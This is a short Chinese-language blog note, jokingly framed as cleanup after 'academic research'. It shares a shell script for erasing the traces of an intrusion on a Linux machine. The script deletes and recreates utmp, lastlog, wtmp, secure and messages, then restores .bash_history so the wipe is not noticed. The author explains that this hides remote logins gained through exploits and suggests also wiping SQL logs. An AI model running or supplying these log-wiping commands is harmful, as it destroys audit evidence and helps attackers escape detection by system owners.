[ Note ] 學術性研究完後要刪的東西

相信大家偶爾會在網路上 "學術性" 研究一些東西
由於馬路跟網路一樣，偶爾會天上掉下來，或路上踢到一些東西
於是這篇就是筆記一下要刪掉哪些東西

首先，我們先直接看一下 code
(PS : 本篇是筆記直接刪掉 log 當然也可以用 > /null ，不過有點麻煩，故不討論) 

 
cp .bash_history .bash_history_old;
rm -fr .bash_history; 
rm -fr /var/run/utmp;
rm -fr /var/log/lastlog;
rm -fr /var/usr/adm/lastlog;
rm -fr .bash_history;
cd /var/log/;
rm -fr wtmp;
rm -fr secure;
rm -fr lastlog;
rm -fr messages;
touch messages;
touch wtmp;
touch secure;
touch lastlog;
cd /root;
rm -fr bash_history;
mv .bash_history_old .bash_history

1. 首先，我們先把目前的 .bash_history 備份起來，等等貼回來
2. 把由於可能用一些 exploit remote login，先 login 資訊刪掉(/utmp 是現在 login，lastlog 是最後 login，不過都先刪掉好了)
3. /var/usr/adm/lastlog 把一些軟體安裝資訊刪掉，因為有時會幫忙（？）裝一些軟體 4. 再來把 messages、wtmp、secure、lastlog 刪掉，刪掉 messages 的原因是因為 mail, cron, daemon, kern, auth 會在那邊 5. 最後把 .bash_history 倒回去就打完收工了 XD

當然，實際要弄得 shell script，會因為環境跟實際在做的東西不同，可能會增減跟修改
例如如果有弄到 SQL 就要把 SQL 的 log 刪掉，這邊只是把之前的 log 刪減部分就直接分享出來 XD
